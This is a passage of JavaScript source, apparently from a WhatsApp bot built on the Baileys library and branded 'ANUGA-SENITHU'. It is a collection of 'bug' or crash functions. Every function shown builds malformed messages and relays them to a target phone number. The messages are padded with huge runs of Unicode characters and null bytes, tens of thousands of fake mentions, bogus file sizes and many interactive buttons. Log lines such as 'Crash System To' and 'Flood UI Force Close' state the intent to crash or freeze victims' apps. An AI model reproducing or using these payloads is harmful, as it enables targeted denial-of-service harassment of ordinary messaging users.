                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
          extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "! ⛶͢🧪ANUGA SENITHU->͢𝙿𝚑𝚞𝚌𝚔𝚈𝚘𝚞𝙶𝚊yy🧪" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
      },
    };

    try {
      const msg = generateWAMessageFromContent(target, mediaFlood, {});
      await XeonBotInc.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
      });
    } catch (err) {
      console.error("Flood UI Force Close Error:", err);
    }
  }
}
async function PayloadCrash6(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
               text: "ৣ!ANUGA-SENITHU?ৢ" + "ꦾ".repeat(90000),
             },
            footer: {
               text: "\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
             },
             nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "{}",
                },
                {
                  name: "catalog_message",
                  buttonParamsJson: "{}",
                },
                {
                  name: "wa_payment_fbpin_reset",
                  buttonParamsJson: "{}",
                },
                {
                  name: "wa_payment_transaction_details",
                  buttonParamsJson: "{}",
                },
                {
                  name: "wa_payment_learn_more",
                  buttonParamsJson: "{}",
                },
                {
                  name: "review_order",
                  buttonParamsJson: "{}",
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: "{}",
                },
                {
                  name: "payment_method",
                  buttonParamsJson: "{}",
                },
                {
                  name: "payment_status",
                  buttonParamsJson: "{}",
                },
                {
                  name: "send_location",
                  buttonParamsJson: "{}",
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "{}",
                 },
                 {
                  name: "cta_copy",
                  buttonParamsJson: "{}",
                 },
                 {
                  name: "cta_call",
                  buttonParamsJson: "{}",
                 },
                 {
                  name: "quick_reply",
                  buttonParamsJson: "{}",
                 },
                 {
                  name: "fdp",
                  buttonParamsJson: "{}",
                 },
                 {
                  name: "mpm",
                  buttonParamsJson: "{}",
                 },
                 {
                  name: "fore_close",
                  buttonParamsJson: "{}",
                 },
                 {
                  name: "cta_single_select",
                  buttonParamsJson: "{}",
                 },
                 {
                  name: "cta_reply",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    };

    await XeonBotInc.relayMessage(target, message, {
      participant: { jid: target },
    });
    console.log(" [ ! ] SENT PAYLOAD CRASH 6");
  } catch (err) {
    console.log(err);
  }
}
async function fcXflow(target) {
  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "! ⛶͢🧪ANUGA SENITHU->͢Here🤡",
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "132222223@s.whatsapp.net"],
          },
          nativeFlowMessage: {
          messageParamsJson: "{[".repeat(10000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ꦽ".repeat(10000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
               {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
                {
                name: "camera_permission_request",
                buttonParamsJson: JSON.stringify({ "cameraAccess": true, }),
              },
            ],
            messageParamsJson: "{[".repeat(10000),
          }, 
        },
      },
    },
  };

  const [janda1, janda2] = await Promise.all([
    await XeonBotInc.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    }),
    await XeonBotInc.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);

  await Promise.all([
    await XeonBotInc.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: janda1 } }),
    await XeonBotInc.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: janda2 } })
  ]);
}
async function VxourthSlow2(target, client) {
    let msg = await generateWAMessageFromContent(
        target,
        {
            interactiveMessage: {
                nativeFlowMessage: {
                    messageParamsJson: "{}".repeat(10000),
                    buttons: [
                        {
                            name: "cta_url",
                            buttonParamsJson: "VXOURTH" + "ꦽ".repeat(50000)
                        },
                        {
                            name: "mpm",
                            buttonParamsJson: "{}".repeat(50000)
                        },
                        {
                            name: "form_message",
                            buttonParamsJson: "{}".repeat(50000)
                        }
                    ]
                },
                contextInfo: {
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    mentionedJid: ["target@s.whatsapp.net"]
                }
            }
        },
        { userJid: target }
    );

    await XeonBotInc.relayMessage(
        target,
        msg.message,
        { messageId: msg.key.id }
    );
}
async function Bug2(target) {
try {
var atc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
"productMessage": {
"product": {
"productImage": {
"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c&mms3=true",
"mimetype": "image/jpeg",
"fileSha256": "4euJQxdTEpk2NS0R7QK6MjGhcix+h1Evxcrrmj1u9nM=",
"fileLength": "9900090",
"height": 735,
"width": 735,
"mediaKey": "e/5eEYHPLtzZAXLn9cBR8M3+w0bvdFsBvoSf9EPy75w=",
"fileEncSha256": "/UO6fl07VoTDsXv1W9zqYAS+pBUz6HVokpl4r84LuOg=",
"directPath": "/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c",
"mediaKeyTimestamp": "1731847042",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEIAQwMBIgACEQEDEQH/xAAuAAACAwEBAAAAAAAAAAAAAAAABQIDBAYBAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAIRZQzqneSimyUheTzUwLiVG35hjcuoVQl3UxzluBhzlPDmixpBgwhI/SYDq16bSbqWvi8cSLnQ6S0nXcpR6vnU8xYjpLRMiTDVnA9zgWSArAoAP/8QAKBAAAgICAQMEAgIDAAAAAAAAAQIAAwQRIRITMQUQIkEycVFhFDOC/9oACAEBAAE/ADUVZCfszKQJlLMfEN1netgVajY7foR0ZuFJ2pBhSp1IYfsR6Atb1HwOQZVZ1Ig1swYqP8mPMd1D/JfBj09/KVmGlCy4uCAvgCPqxV3/AESISEvH8MJZWGeKLGNiNyVmHcS/aZOQZ/w0zcjqv2p2BMQmxA7ER2VbOYVb/I2D8SstQMv9jxAXLBG8geRP9JZ2PkTEYJfa7EfzF9VrmyTuYWYKyEbxMn8VK66m55iWMSCy/ICO9mlIHiO94YOAJe69oIfyaXBqXKBtn79kwnso7qGJi7AcMImR1N2rn/RlKV9tSpBiHq6t+NzLupqO0O3mGnW/ctbbGZ+GoJZPuFG3MK0PT2g2juDDpVuqepUIoBRJVkXUaZH4j519nltCYVLWt1dHVqCis6PRphMlqRUxtjuCza8bgJU9Q4mL6khXpuOmhei9CvWpBmQnasZN8AwCYlmPRjL8xLvWEHFaS6625iWY+zgbbXiEbnU48EiFt+YvPE5EbmIeRuMNkyvmtov5xwNt7LG8T6g9v//EABkRAAIDAQAAAAAAAAAAAAAAABEwAAEQIP/aAAgBAgEBPwBI0cCWj//EABkRAAIDAQAAAAAAAAAAAAAAAAARARAgMP/aAAgBAwEBPwDLuRip4ZHD/9k="
},
"productId": "28364464939807272",
"title": "⚰️ ANUGA-SENITHU 𝐗⃰  𝗭𝗢𝗢" + "ꦾ".repeat(90000),
"description": "⚰️ ANUGA-SENITHU 𝐗⃰  𝗭𝗢𝗢⃰" + "ꦾ".repeat(90000),
"currencyCode": "⚰️ ANUGA-SENITHU 𝐗⃰  𝗭𝗢𝗢⃰‌" + "ꦾ".repeat(90000),
"priceAmount1000": "999999999999999",
"productImageCount": 1
},
"businessOwnerJid": "0@s.whatsapp.net",
"contextInfo": {}
}
 }
}
}), { 
userJid: target, 
quoted: m
});
await XeonBotInc.relayMessage(target, atc.message, { participant: { jid: target }, messageId: atc.key.id });

} catch (error) {
console.error("Failed to send message:", error);
}
console.log(chalk.red.bold(`Crash System To ${target}`));
}
async function HardProtocolBug(target) {
  const MSG = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "",
          previewType: "PHOTO",
          contextInfo: {
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 40000 },
                () => "1" + Math.floor(Math.random() * 1000000) + "@s.whatsapp.net"
              ),
            ],
            userScans: -99288282828288, //not change
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  await XeonBotInc.relayMessage(
    target,
    {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25,
          },
        },
      },
    },
    {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "false" },
          content: undefined,
        },
      ],
    }
  );

  console.log(chalk.green("done"));
}
async function ANUGA-SENITHUphuck(target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title:
            "x - ANUGA-SENITHU" + "ꦽ".repeat(16999),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🧢",
          },
          contextInfo: {
            virtexId: XeonBotInc.generateMessageTag(),
            participant: "120363399531796033@s.whatsapp.net",
            mentionedJid: ["120363399531796033@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "Z?" + "\u0000".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath:
                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: o,
                },
                hasMediaAttachment: true,
                contentText: 'ANUGA-SENITHU - biz"👋"',
                footerText: "biz - id - ANUGA-SENITHU ꦽ",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "ANUGA-SENITHU - xtech" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "x - biz" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "ANUGA-SENITHU" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: o,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "120363399531796033@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "❤️",
            entryPointConversionApp: "💛",
            actionLink: {
              url: "t.me/anuga_official",
              buttonTitle: "ANUGA-SENITHU",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "😼",
            parentGroupJid: "😽",
            trustBannerType: "😾",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `@120363399531796033${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "@120363399531796033".repeat(2999),
        },
        messageContextInfo: {
          messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };
  let sections = [];
  for (let i = 0; i < 1; i++) {
    let largeText = "\u0000".repeat(11999);
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(999),
          subrows: [
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }
  let listMessage = {
    title: "ANUGA-SENITHU - biz",
    sections: sections,
  };
  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: '! ⛶͢🧪ANUGA SENITHU->͢𝙿𝚑𝚞𝚌𝚔𝚈𝚘𝚞𝙶𝚊𝚢𝚎🧪🉃 ꦽ - "biz" 🧢' + "ꦽ".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "ANUGA-SENITHU - mids" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  await XeonBotInc.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(`ANUGA-SENITHU Attack ${target}`);
  await XeonBotInc.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  await XeonBotInc.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
  console.log(`ANUGA-SENITHU Attack ${target}`);
}
async function fcnew(target) {
  let ClientRequestAi = JSON.stringify({
    model: "meta",
    messages: [
      {
        role: "is_ai_message",
        content: true,
      },
      {
        role: "users",
        content: target
      }
    ],
    functions: [{
      name: "call_permission_request",
      description: "",
      parameters: {
        type: "object",
        properties: {
          full_name: {
            type: "string",
            description: ""
          },
          product_name: {
            type: "string",
            description: "."
          },
          complaint_summary: {
            type: "string",
            description: "A."
          },
        },
        required: ["full_name", "product_name", "complaint_summary"]
      }
    }],
    function_call: {
      name: "request_accepted"
    }
  }, null, 2);

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          contextInfo: {
            shop: 999,
            subtitle: "",
            id: "cb1p",
            mentionedJid: [target],
            expiration: 999,
            ephemeralSettingTimestamp: 999,
            entryPointConversionSource: "cache",
            entryPointConversionApp: "Whatsapp",
            entryPointConversionDelaySeconds: 999,
            disappearingMode: {
              initiator: "INITIATED_BY_OTHER",
              trigger: "ACCOUNT_SETTING"
            }
          },
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "Ᏽ𐌉ⱿⱿ 𐌄𐋄𐌄𐌂𐌵𐌕𐌄𐌓𐌄𐌃"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: ClientRequestAi
                },
                {
                  name: "to",
                  buttonParamsJson: ClientRequestAi
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: ClientRequestAi
                },
                {
                  name: "request_accepted",
                  buttonParamsJson: ClientRequestAi
                },
              ]
            },
          },
        },
      },
    },
    { "call_permission_request": ["Array"] },
  );

  await XeonBotInc.relayMessage(target, msg.message, {
    messageId: null,
    participant: { jid: target }
  });
}
async function delayMaker4(target, mention = false, delayMs = 400) {
  for (const targett of target) {
    const generateMessage = {
     viewOnceMessage: {
       message: {
         imageMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m232/AQMP8t4-5ZHQ2nk8fAsUgGYB9q-UTgb-mAIQWjNHknLZCQpzrkkuCXh-3tbqjIl8B2XweM63Sh5uoFv-pouKkoGw4z-MWgpHSsTAnUuTw?ccb=9-4&oh=01_Q5Aa1gF2bGk5pbx0dyuS7FH7gF7yv65XoTi_DZMzLNSMRZdPtA&oe=684B6ED1&_nc_sid=e6ed6c&mms3=true",
         mimetype: "image/jpeg",
         caption: "love killing the ram" + "\u200b".repeat(11111),
         fileSha256: "1VqMUklyU+UL/CyOtNmda9uTCYoE/jTW/YStC44ge28=",
         fileLength: { low: 629145600, high: 0, unsigned: true },
         height: 2810,
         width: 6213,
         mediaKey: "3fpHZJT66ITBU7AwbBT3c9x8wwwdvJVtAGYu3DSfE7s=",
         fileEncSha256: "WRkVr7oxZzAZ24sMLYfc/WzxOC8Y9Kjc8nJLWi3Dk1s=",
         directPath: "/o1/v/t62.7118-24/f2/m232/AQMOP8t-5ZHQ2nk8fAsUgGYB9q-UTgb-mAIQWjNHknLZCQpzrkkuCXh-3tbqjIl8B2XweM63Sh5uoFv-pouKkoGw4z-MWgpHSsTAnUuTw?ccb=9-4&oh=01_Q5Aa1gF2bGk5pbx0dyuS7FH7gF7yv65XoTi_DZMzLNSMRZdPtA&oe=684B6ED1&_nc_sid=e6ed6c",
         mediaKeyTimestamp: "1743225419",
         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2MBERISGBUYLxoaL2NCOEJjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY//AABEIACIAIAMBEQACEQEDEQH/xAGiAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgsQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+gEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoLEQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS8BVictEKFiQ04SXxFxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2gAMAwEAAhEDEQA/AOEt4HnfauB2yxwB+PQVMpKKJlKxrXlkkcTRwRMI9nmE+WC6sFGQT1xk4J4G4NxxiueFTmev9f1+VtTJTu9SzbWUF1YIRbL5hiJKgENK4DHgnJI4XITH3u2MVnKcoT30v9y0/wCDv2IcnGVr6f1/WpjajYvZXUsZXKI+0MG3AdcDOBzwfToa6qVRVIpm8J8yub2lqlrpKymPfEwyWliLxNk4ORg8hhg8rwqnB6Vx1ffqW/J2f6dNtH123MJ+9OwaQbTU7u5e/kSK2tgAkTSYGCcZLZz2UfkOgAoxDqUopU1q+tgq80EuXdk2tRWeleXdadMgfzPKeESFskcnvkEcfQ4IwcVGGnUq3jUXncik5z0kU7u7e9hCSOv2YviWQrypfJ7YzjbngAEryD1O8Kag21v/AJf156GkY8ruZ0SDYN0xzhQDuyig5Y/Tnt9e9bN9l/mW3Y07G7NiYpLxoEjR/JAeMmVcMGPboCQeeeDjBrnqwU7qKffy2t+X/BM5R5tEP1S+adZZLSS1by05LI29gyqrbcj6DJ+bg844qaVPla5k9f0u1t/w3zFCNn71yO10yL7JJJdMoZcr80hTaThclSv8LEZ549CCM3OrLmSj/XX8Vtp/wG5u9kZul6gIWWGXaEJ2+Yw3bFOe3oCc4GM8g5zWtalzK6/r+vw3RrUhfVGvfWlvcqzHjAdUz8hIUMcng9Nn3cfxLyBhV56dSUXb+tbf57+T06vGMmmVtNWFJrcsFQvkB2lXC4I5xkFcDPXk9sHBGtZy5Xb+v8/6uVNuzItV1VjG9ogYEHBYqqMOoOQo67SF9MA8ZPBRope9/wAH8/v9eo6dPW/9f11MSus6DVsZpYtLmljldJRNGgdWIIXa3GfTgcewrmnFSqKLWln+hhNJzsxv3dLuJF4dZYwGHUAh88/hTf8AEiuln+gfbSMyug3P/9k=",
         contextInfo: {
           mentionedJid: Array.from({ length: 38110 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
           isSampled: true,
           participant: target,
           remoteJid: "status@broadcast",
           forwardingScore: 9741,
           isForwarded: true
           }
         }
       }
     }
   };
 
   const msg = generateWAMessageFromContent(target, generateMessage, {});
        
   await XeonBotInc.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
       statusJidList: [target],
         additionalNodes: [
               {
               tag: "meta",
               attrs: {},
               content: [
               {
               tag: "mentioned_users",
               attrs: {},
               content: [
               {
                tag: "to",
                attrs: { jid: target },
                content: undefined
                }
              ]
            }
          ]
        }
      ]
   });
   if (mention) {
     await XeonBotInc.relayMessage(
       target,
            {
            statusMentionMessage: {
            message: {
            protocolMessage: {
            key: msg.key,
            type: 25
            }
          }
        }
      },
        {
          additionalNodes: [
          {
          tag: "meta",
          attrs: { is_status_mention: "I'll call you" },
          content: undefined
               }
             ]
           }
         );
       }
     await new Promise(res => setTimeout(res, delayMs));
   }
 }
async function CoreX(isTarget) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [isTarget],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: isTarget,
              },
              participant: isTarget,
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "",
                        format: "",
                      },
                    },
                  },
                },
              },
            },
            body: {
              text: "{".repeat(10000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    };

    await XeonBotInc.relayMessage(isTarget, message, {
      participant: { jid: isTarget },
    });
  } catch (err) {
    console.log(err);
  }
}
async function CursorCrL(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '@ANUGA-SENITHU • #Bug 🦠',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "@ANUGA-SENITHU • #Bug 🦠"
                },
                footer: {
                  text: "phynx.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.green(`Successfully Send ${chalk.red("CursorCrl")} to ${target}`))
}
